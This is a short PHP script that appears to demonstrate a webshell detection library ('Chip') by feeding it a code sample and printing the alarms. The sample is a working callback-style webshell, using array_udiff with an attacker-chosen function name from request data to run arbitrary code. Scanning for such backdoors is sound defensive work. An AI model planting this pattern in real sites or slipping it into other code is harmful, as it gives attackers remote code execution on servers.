<?php
require 'vendor/autoload.php';

use Chip\Exception\FormatException;
use Chip\ChipFactory;

$code = <<<'CODE'
<?php
$e = $_REQUEST['e'];
$arr = array($_POST['pass']);
$arr2 = array(1);
array_udiff($arr, $arr2, $e);
CODE;


try {
    $chipManager = (new ChipFactory)->create();
    $alarm = $chipManager->detect($code);

    print_r($alarm);
} catch (FormatException $e) {
    echo $e->getMessage();
}
